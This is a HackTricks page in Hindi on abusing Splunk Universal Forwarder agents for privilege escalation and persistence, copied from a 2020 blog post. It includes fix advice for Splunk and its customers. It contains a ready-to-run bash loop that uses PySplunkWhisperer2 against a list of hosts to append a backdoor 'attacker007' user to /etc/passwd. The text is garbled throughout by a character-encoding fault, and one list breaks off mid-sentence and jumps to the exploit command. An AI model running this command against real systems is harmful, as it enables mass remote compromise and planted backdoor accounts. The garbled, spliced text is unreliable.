# Splunk LPE рдФрд░ рдкрд░реНрд╕рд┐рд╕реНрдЯреЗрдВрд╕

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**.
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛрдЬрд╝ рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>

рдпрджрд┐ рдЖрдк **рдЖрдВрддрд░рд┐рдХ рд░реВрдк рд╕реЗ** рдпрд╛ **рдмрд╛рд╣рд░реА рд░реВрдк рд╕реЗ** рдорд╢реАрди рдХрд╛ **рдПрдиреНрдпреБрдорд░реЗрд╢рди** рдХрд░рддреЗ рд╕рдордп **Splunk рдЪрд▓рддреЗ рд╣реБрдП рдкрд╛рддреЗ рд╣реИрдВ** (рдкреЛрд░реНрдЯ 8090), рдФрд░ рдпрджрд┐ рдЖрдкрдХреЛ рдХреЛрдИ **рдорд╛рдиреНрдп рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рдкрддрд╛ рд╣реИрдВ, рддреЛ рдЖрдк **Splunk рд╕рд░реНрд╡рд┐рд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ** **рд╢реЗрд▓ рдХреЛ рдПрдХреНрдЬреАрдХреНрдпреВрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ Splunk рдЪрд▓рд╛рдиреЗ рд╡рд╛рд▓реЗ рдпреВрдЬрд░ рдХреЗ рд░реВрдк рдореЗрдВред рдЕрдЧрд░ рд░реВрдЯ рдЗрд╕реЗ рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк рд░реВрдЯ рддрдХ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХрд▓реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ рдЖрдк **рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд░реВрдЯ рд╣реИрдВ рдФрд░ Splunk рд╕рд░реНрд╡рд┐рд╕ рдХреЗрд╡рд▓ localhost рдкрд░ рд╕реБрди рдирд╣реАрдВ рд░рд╣реА рд╣реИ**, рддреЛ рдЖрдк **Splunk рд╕рд░реНрд╡рд┐рд╕ рд╕реЗ** **рдкрд╛рд╕рд╡рд░реНрдб** рдлрд╛рдЗрд▓ **рдЪреБрд░рд╛** рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкрд╛рд╕рд╡рд░реНрдбреНрд╕ рдХреЛ **рдХреНрд░реИрдХ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╛ рдЙрд╕рдореЗрдВ **рдирдП** рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ **рдЬреЛрдбрд╝** рд╕рдХрддреЗ рд╣реИрдВред рдФрд░ рд╣реЛрд╕реНрдЯ рдкрд░ рдкрд░реНрд╕рд┐рд╕реНрдЯреЗрдВрд╕ рдмрдирд╛рдП рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВред

рдиреАрдЪреЗ рджреА рдЧрдИ рдкрд╣рд▓реА рдЗрдореЗрдЬ рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ Splunkd рд╡реЗрдм рдкреЗрдЬ рдХреИрд╕рд╛ рджрд┐рдЦрддрд╛ рд╣реИред

**рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬрд╛рдирдХрд╛рд░реА** [**https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/**](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) **рд╕реЗ рдХреЙрдкреА рдХреА рдЧрдИ рд╣реИ**

## Splunk Forwarders рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рд╢реЗрд▓реНрд╕ рдФрд░ рдкрд░реНрд╕рд┐рд╕реНрдЯреЗрдВрд╕ рдХреЗ рд▓рд┐рдП

14 рдЕрдЧрд╕реНрдд 2020

### рд╡рд┐рд╡рд░рдг: <a href="#description" id="description"></a>

Splunk Universal Forwarder Agent (UF) рдкреНрд░рдорд╛рдгрд┐рдд рджреВрд░рд╕реНрде рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ Splunk API рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдЬреЗрдВрдЯреЛрдВ рдХреЛ рдПрдХрд▓ рдХрдорд╛рдВрдб рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред UF рдПрдЬреЗрдВрдЯ рдпрд╣ рдирд╣реАрдВ рдЬрд╛рдВрдЪрддрд╛ рдХрд┐ рдЖрдиреЗ рд╡рд╛рд▓реЗ рдХрдиреЗрдХреНрд╢рди рдПрдХ рдорд╛рдиреНрдп Splunk Enterprise рд╕рд░реНрд╡рд░ рд╕реЗ рд╣реИрдВ, рди рд╣реА UF рдПрдЬреЗрдВрдЯ рдХреЛрдб рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╡рд╣ рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рдЕрдиреНрдпрдерд╛ Splunk Enterprise рд╕рд░реНрд╡рд░ рд╕реЗ рд╕рд╛рдмрд┐рдд рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЬреЛ UF рдПрдЬреЗрдВрдЯ рдкрд╛рд╕рд╡рд░реНрдб рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ, рд╕рд░реНрд╡рд░ рдкрд░ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЖрдзрд╛рд░ рдкрд░ SYSTEM рдпрд╛ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдордирдорд╛рдиреЗ рдХреЛрдб рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рдпрд╣ рд╣рдорд▓рд╛ рдкреЗрдиреЗрдЯреНрд░реЗрд╢рди рдЯреЗрд╕реНрдЯрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдФрд░ рд╕рдВрднрд╡рддрдГ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рд╣рдорд▓рд╛рд╡рд░реЛрдВ рджреНрд╡рд╛рд░рд╛ рдЬрдВрдЧрд▓реА рдореЗрдВ рд╕рдХреНрд░рд┐рдп рд░реВрдк рд╕реЗ рд╢реЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдЧреНрд░рд╛рд╣рдХ рдХреЗ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рд╕реИрдХрдбрд╝реЛрдВ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд╕рдордЭреМрддреЗ рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

Splunk UF рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдЕрдкреЗрдХреНрд╖рд╛рдХреГрдд рдЖрд╕рд╛рди рд╣реИ, рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП рд╕реЗрдХреНрд╢рди Common Password Locations рджреЗрдЦреЗрдВред

### рд╕рдВрджрд░реНрдн: <a href="#context" id="context"></a>

Splunk рдПрдХ рдбреЗрдЯрд╛ рдПрдЧреНрд░реАрдЧреЗрд╢рди рдФрд░ рд╕рд░реНрдЪ рдЯреВрд▓ рд╣реИ рдЬрд┐рд╕реЗ рдЕрдХреНрд╕рд░ рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рдЗрдиреНрдлреЙрд░реНрдореЗрд╢рди рдФрд░ рдЗрд╡реЗрдВрдЯ рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ (SIEM) рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред Splunk Enterprise Server рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣реИ рдЬреЛ рдПрдХ рд╕рд░реНрд╡рд░ рдкрд░ рдЪрд▓рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдПрдЬреЗрдВрдЯ рд╣реЛрддреЗ рд╣реИрдВ, рдЬрд┐рдиреНрд╣реЗрдВ Universal Forwarders рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдкреНрд░рддреНрдпреЗрдХ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред Splunk Windows, Linux, Mac, рдФрд░ Unix рдХреЗ рд▓рд┐рдП рдПрдЬреЗрдВрдЯ рдмрд╛рдЗрдирд░реАрдЬ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдХрдИ рд╕рдВрдЧрдарди Linux/Unix рд╣реЛрд╕реНрдЯреНрд╕ рдкрд░ рдПрдЬреЗрдВрдЯ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрдЬрд╛рдп Syslog рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Splunk рдХреЛ рдбреЗрдЯрд╛ рднреЗрдЬрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдПрдЬреЗрдВрдЯ рд╕реНрдерд╛рдкрдирд╛ рдмрдврд╝рддреА рд╣реБрдИ рд▓реЛрдХрдкреНрд░рд┐рдпрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд░рд╣реА рд╣реИред

Universal Forwarder рдкреНрд░рддреНрдпреЗрдХ рд╣реЛрд╕реНрдЯ рдкрд░ https://host:8089 рдкрд░ рд╕реБрд▓рдн рд╣реИред рдХрд┐рд╕реА рднреА рд╕реБрд░рдХреНрд╖рд┐рдд API рдХреЙрд▓реНрд╕, рдЬреИрд╕реЗ рдХрд┐ /service/ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдкрд░ рдПрдХ Basic рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдмреЙрдХреНрд╕ рдкреЙрдк рдЕрдк рд╣реЛрддрд╛ рд╣реИред рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рд╣рдореЗрд╢рд╛ admin рд╣реЛрддрд╛ рд╣реИ, рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдбрд┐рдлрд╝реЙрд▓реНрдЯ changeme рд╣реБрдЖ рдХрд░рддрд╛ рдерд╛ рдЬрдм рддрдХ рдХрд┐ 2016 рдореЗрдВ Splunk рдиреЗ рдХрд┐рд╕реА рднреА рдирдП рд╕реНрдерд╛рдкрдирд╛ рдХреЗ рд▓рд┐рдП 8 рдЕрдХреНрд╖рд░ рдпрд╛ рдЙрд╕рд╕реЗ рдЕрдзрд┐рдХ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рдХреАред рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдореЗрд░реЗ рдбреЗрдореЛ рдореЗрдВ рдиреЛрдЯ рдХрд░реЗрдВрдЧреЗ, рдЬрдЯрд┐рд▓рддрд╛ рдПрдХ рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдореЗрд░рд╛ рдПрдЬреЗрдВрдЯ рдкрд╛рд╕рд╡рд░реНрдб 12345678 рд╣реИред рдПрдХ рджреВрд░рд╕реНрде рд╣рдорд▓рд╛рд╡рд░ рдмрд┐рдирд╛ рд▓реЙрдХрдЖрдЙрдЯ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдХрд┐ рдПрдХ рд▓реЙрдЧ рд╣реЛрд╕реНрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдЕрдЧрд░ рдЦрд╛рддрд╛ рд▓реЙрдХ рд╣реЛ рдЧрдпрд╛ рддреЛ рд▓реЙрдЧ рдЕрдм Splunk рд╕рд░реНрд╡рд░ рдХреЛ рдирд╣реАрдВ рднреЗрдЬреЗ рдЬрд╛рдПрдВрдЧреЗ рдФрд░ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдкрдиреЗ рд╣рдорд▓реЛрдВ рдХреЛ рдЫрд┐рдкрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ Universal Forwarder рдПрдЬреЗрдВрдЯ рдХреЛ рджрд┐рдЦрд╛рддрд╛ рд╣реИ, рдпрд╣ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдкреГрд╖реНрда рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд┐рдирд╛ рд╕реБрд▓рдн рд╣реИ рдФрд░ Splunk Universal Forwarder рдЪрд▓рд╛рдиреЗ рд╡рд╛рд▓реЗ рд╣реЛрд╕реНрдЯреНрд╕ рдХреЛ рдЧрд┐рдирдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

![0](https://eapolsniper.github.io/assets/2020AUG14/11\_SplunkAgent.png)

Splunk рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рд╕рднреА рдПрдЬреЗрдВрдЯреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рд╣реА Universal Forwarding рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЛ рджрд┐рдЦрд╛рддрд╛ рд╣реИ, рдореБрдЭреЗ рдпрд╛рдж рдирд╣реАрдВ рд╣реИ рдХрд┐ рдпрд╣ рдПрдХ рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдпрд╛ рдпрджрд┐ рдкреНрд░рддреНрдпреЗрдХ рдПрдЬреЗрдВрдЯ рдХреЗ рд▓рд┐рдП рд╡реНрдпрдХреНрддрд┐рдЧрдд рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗрдЯ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдФрд░ рдореЗрд░реА рдпрд╛рджрджрд╛рд╢реНрдд рд╕реЗ рдЬрдм рдореИрдВ Splunk рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдерд╛, рдореБрдЭреЗ рд╡рд┐рд╢реНрд╡рд╛рд╕ рд╣реИ рдХрд┐ рд╕рднреА рдПрдЬреЗрдВрдЯреЛрдВ рдХреЛ рдПрдХ рд╣реА рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЕрдЧрд░ рдкрд╛рд╕рд╡рд░реНрдб рдПрдХ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдкрд╛рдпрд╛ рдпрд╛ рдХреНрд░реИрдХ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╕рднреА Splunk UF рд╣реЛрд╕реНрдЯреНрд╕ рдкрд░ рдХрд╛рдо рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИред рдпрд╣ рдореЗрд░рд╛ рд╡реНрдпрдХреНрддрд┐рдЧрдд рдЕрдиреБрднрд╡ рд░рд╣рд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕реИрдХрдбрд╝реЛрдВ рд╣реЛрд╕реНрдЯреНрд╕ рдХрд╛ рддреЗрдЬреА рд╕реЗ рд╕рдордЭреМрддрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### рд╕рд╛рдорд╛рдиреНрдп рдкрд╛рд╕рд╡рд░реНрдб рд╕реНрдерд╛рди <a href="#common-password-locations" id="common-password-locations"></a>

рдореИрдВ рдЕрдХреНрд╕рд░ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдерд╛рдиреЛрдВ рдкрд░ Splunk Universal Forwarding рдПрдЬреЗрдВрдЯ рдХрд╛ рдкреНрд▓реЗрди рдЯреЗрдХреНрд╕реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдкрд╛рддрд╛ рд╣реВрдВ:

1. Active Directory Sysvol/domain.com/Scripts рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред рдкреНрд░рд╢рд╛рд╕рдХ рдХреБрд╢рд▓ рдП
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
рдореЗрдЬрд╝рдмрд╛рди рдЬрд╛рдирдХрд╛рд░реА:

Splunk Enterprise Server: 192.168.42.114\
Splunk Forwarder Agent рдкреАрдбрд╝рд┐рдд: 192.168.42.98\
рд╣рдорд▓рд╛рд╡рд░: 192.168.42.51

Splunk Enterprise рд╕рдВрд╕реНрдХрд░рдг: 8.0.5 (12 рдЕрдЧрд╕реНрдд, 2020 рдХреЛ рд▓реИрдм рд╕реЗрдЯрдЕрдк рдХреЗ рджрд┐рди рддрдХ рдирд╡реАрдирддрдо)\
Universal Forwarder рд╕рдВрд╕реНрдХрд░рдг: 8.0.5 (12 рдЕрдЧрд╕реНрдд, 2020 рдХреЛ рд▓реИрдм рд╕реЗрдЯрдЕрдк рдХреЗ рджрд┐рди рддрдХ рдирд╡реАрдирддрдо)

#### Splunk, Inc рдХреЗ рд▓рд┐рдП рд╕реБрдзрд╛рд░ рд╕рд┐рдлрд╛рд░рд┐рд╢реЗрдВ: <a href="#remediation-recommendations-for-splunk-inc" id="remediation-recommendations-for-splunk-inc"></a>

рдореИрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рдорд╛рдзрд╛рдиреЛрдВ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░рддрд╛ рд╣реВрдБ рдЬреЛ рдЧрд╣рд░рд╛рдИ рдореЗрдВ рд░рдХреНрд╖рд╛ рдкреНрд░рджрд╛рди рдХрд░реЗрдВрдЧреЗ:

1. рдЖрджрд░реНрд╢ рд░реВрдк рд╕реЗ, Universal Forwarder рдПрдЬреЗрдВрдЯ рдХрд╛ рдХреЛрдИ рднреА рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛ рдирд╣реАрдВ рд╣реЛрдЧрд╛, рдмрд▓реНрдХрд┐ рдпрд╣ рдирд┐рдпрдорд┐рдд рдЕрдВрддрд░рд╛рд▓ рдкрд░ Splunk рд╕рд░реНрд╡рд░ рд╕реЗ рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЗ рд▓рд┐рдП рдкреЛрд▓ рдХрд░реЗрдЧрд╛ред
2. рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ TLS рдореНрдпреВрдЪреБрдЕрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ, рдкреНрд░рддреНрдпреЗрдХ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд▓рд┐рдП рд╡реНрдпрдХреНрддрд┐рдЧрдд рдХреБрдВрдЬрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдПред рдпрд╣ рд╕рднреА Splunk рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдмреАрдЪ рдмрд╣реБрдд рдЙрдЪреНрдЪ рджреНрд╡рд┐рдкрдХреНрд╖реАрдп рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рджрд╛рди рдХрд░реЗрдЧрд╛ред TLS рдореНрдпреВрдЪреБрдЕрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдПрдЬреЗрдВрдЯреНрд╕ рдФрд░ IoT рдЙрдкрдХрд░рдгреЛрдВ рдореЗрдВ рднрд╛рд░реА рд░реВрдк рд╕реЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рдпрд╣ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдбрд┐рд╡рд╛рдЗрд╕ рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реЗ рд╕рд░реНрд╡рд░ рд╕рдВрдЪрд╛рд░ рдХрд╛ рднрд╡рд┐рд╖реНрдп рд╣реИред
3. рд╕рднреА рдХреЛрдб, рдПрдХрд▓ рдкрдВрдХреНрддрд┐ рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдлрд╛рдЗрд▓реЛрдВ рдХреЛ, рдПрдХ рд╕рдВрдкреАрдбрд╝рд┐рдд рдлрд╛рдЗрд▓ рдореЗрдВ рднреЗрдЬреЗрдВ рдЬреЛ Splunk рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдФрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рд╣реЛред рдпрд╣ API рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬреЗ рдЧрдП рдПрдЬреЗрдВрдЯ рдбреЗрдЯрд╛ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рддреАрд╕рд░реЗ рдкрдХреНрд╖ рд╕реЗ рдорд▓рд┐рд╢рд┐рдпрд╕ рд░рд┐рдореЛрдЯ рдХреЛрдб рдПрдХреНрдЬреАрдХреНрдпреВрд╢рди рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛ рдХрд░рддрд╛ рд╣реИред

#### Splunk рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реБрдзрд╛рд░ рд╕рд┐рдлрд╛рд░рд┐рд╢реЗрдВ: <a href="#remediation-recommendations-for-splunk-customers" id="remediation-recommendations-for-splunk-customers"></a>

1. Splunk рдПрдЬреЗрдВрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрд╣реБрдд рдордЬрдмреВрдд рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗрдЯ рдХрд░рдирд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВред рдореИрдВ рдХрдо рд╕реЗ рдХрдо 15-рдЕрдХреНрд╖рд░ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдкрд╛рд╕рд╡рд░реНрдб рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░рддрд╛ рд╣реВрдБ, рд▓реЗрдХрд┐рди рдЪреВрдВрдХрд┐ рдпреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХрднреА рдЯрд╛рдЗрдк рдирд╣реАрдВ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЗрд╕реЗ 50 рдЕрдХреНрд╖рд░реЛрдВ рдЬреИрд╕реЗ рдмрд╣реБрдд рдмрдбрд╝реЗ рдкрд╛рд╕рд╡рд░реНрдб рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
2. рд╣реЛрд╕реНрдЯ рдЖрдзрд╛рд░рд┐рдд рдлрд╛рдпрд░рд╡реЙрд▓ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдХреЗрд╡рд▓ Splunk рд╕рд░реНрд╡рд░ рд╕реЗ 8089/TCP рдкреЛрд░реНрдЯ (Universal Forwarder Agent рдХрд╛ рдкреЛрд░реНрдЯ) рдкрд░ рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛред

### Red Team рдХреЗ рд▓рд┐рдП рд╕рд┐рдлрд╛рд░рд┐рд╢реЗрдВ: <a href="#recommendations-for-red-team" id="recommendations-for-red-team"></a>

1. рдкреНрд░рддреНрдпреЗрдХ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд▓рд┐рдП Splunk Universal Forwarder рдХреА рдПрдХ рдкреНрд░рддрд┐ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ рдмрд╣реБрдд рдЕрдЪреНрдЫрд╛ рд╣рд▓реНрдХрд╛ рд╡рдЬрди рд╡рд╛рд▓рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдЗрдореНрдкреНрд▓рд╛рдВрдЯ рд╣реИред рдЕрдЪреНрдЫрд╛ рд╣реЛрдЧрд╛ рдЕрдЧрд░ Splunk рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЗрд╕реЗ рдареАрдХ рдХрд░рддрд╛ рд╣реИ рддреЛ рдПрдХ рдкреНрд░рддрд┐ рд░рдЦреЗрдВред

### рдЕрдиреНрдп рд╢реЛрдзрдХрд░реНрддрд╛рдУрдВ рд╕реЗ Exploits/Blogs <a href="#exploitsblogs-from-other-researchers" id="exploitsblogs-from-other-researchers"></a>

